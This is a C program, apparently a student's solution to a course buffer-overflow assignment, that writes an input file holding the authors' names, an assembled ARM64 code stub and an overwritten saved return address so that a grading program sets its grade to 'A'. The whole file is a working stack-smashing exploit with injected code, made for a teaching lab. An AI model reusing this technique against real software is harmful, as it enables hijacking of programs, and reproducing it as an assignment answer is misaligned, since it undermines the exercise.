/*
 * createdataA.c  —  C89-compliant “print name + set grade to A” exploit
 *
 * Layout written to dataA:
 *   0x420058  "Ben Zhou and Owen Clarke\0"   (25 bytes)
 *   padding   0–3 NUL bytes for alignment    (here: 3)
 *   0x420074  48-byte stub (assembled below) ┐
 *   …         …                              │  executed after buffer overflow
 *   0x4200A4  overwritten saved x30 = 0x420074┘
 */

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Absolute addresses from the grader’s .map file */
enum {
    NAME_ADDR  = 0x420058UL,   /* start of name[] in BSS (RWX) */
    GRADE_ADDR = 0x420044UL,   /* address of global grade      */
    PRINT_ADDR = 0x40089cUL    /* grader’s print-grade routine */
};

int main(void)
{
    /* ---------------- declarations (C89 requires them first) ---------------- */
    FILE          *f;
    const char    *myName;
    size_t         nName;
    size_t         pad;
    unsigned long  STUB_ADDR;
    unsigned long  pc;          /* “program counter” while assembling */
    unsigned int   instr;       /* one 32-bit instruction            */
    size_t         i;           /* generic loop counter              */

    /* ---------------- 0. open output file ---------------- */
    f = fopen("dataA", "wb");
    if (f == NULL) {
        perror("dataA");
        return 1;
    }

    /* ---------------- 1. write printable name ------------- */
    myName  = "Ben Zhou and Owen Clarke";
    nName   = strlen(myName) + 1;           /* include terminating NUL */
    fwrite(myName, 1, nName, f);

    /* pad with extra NULs so the stub starts on a 4-byte boundary */
    pad = (4 - (nName & 3U)) & 3U;          /* 0‥3 bytes */
    for (i = 0; i < pad; i++)
        fputc('\0', f);

    /* ---------------- 2. assemble & emit 48-byte stub ------ */
    STUB_ADDR = NAME_ADDR + nName + pad;    /* run-time start addr */
    pc        = STUB_ADDR;

    /* 2a. ADR x0, &grade */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2b. MOV w1, #'A' */
    instr = MiniAssembler_mov(1, 'A');
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2c. STRB w1, [x0] */
    instr = MiniAssembler_strb(1, 0);       /* from w1, to x0 */
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2d. B   PRINT_ADDR */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2e. pad stub to exactly 48 bytes with MOV w0,#0 (acts like NOP) */
    while (pc < STUB_ADDR + 48UL) {
        instr = MiniAssembler_mov(0, 0);
        fwrite(&instr, 4, 1, f);
        pc += 4;
    }

    /* ---------------- 3. smash saved return address -------- */
    fwrite(&STUB_ADDR, sizeof(STUB_ADDR), 1, f);

    /* ---------------- done --------------------------------- */
    fclose(f);
    return 0;
}
